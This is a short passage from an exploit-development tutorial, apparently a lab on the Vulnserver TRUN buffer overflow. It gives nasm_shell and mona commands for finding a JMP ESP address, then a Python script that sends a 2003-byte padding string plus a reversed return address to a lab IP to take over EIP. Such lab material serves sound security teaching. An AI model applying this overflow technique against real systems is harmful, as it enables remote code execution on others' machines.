6-Finding the Right Module

~~~bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
~~~

Search NASM for “JMP ESP” (minus the quotes). (\xff\xe4)

~~~cmd
!mona modules
~~~

~~~cmd
!mona find -s "\xff\xe4" -m module.ext
~~~

~~~python
#!/usr/bin/python
import sys, socket

#EIP->JMP ESP = "625011AF" -- Must be inserted backwards for "little indian"

eipown = "A" * 2003 + "\xaf\x11\x50\x62"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.253.129",9999))
	s.send(('TRUN /.:/' + eipown))
	s.close()

except:
	print "Error Connecting to Server..."
	sys.exit()

~~~

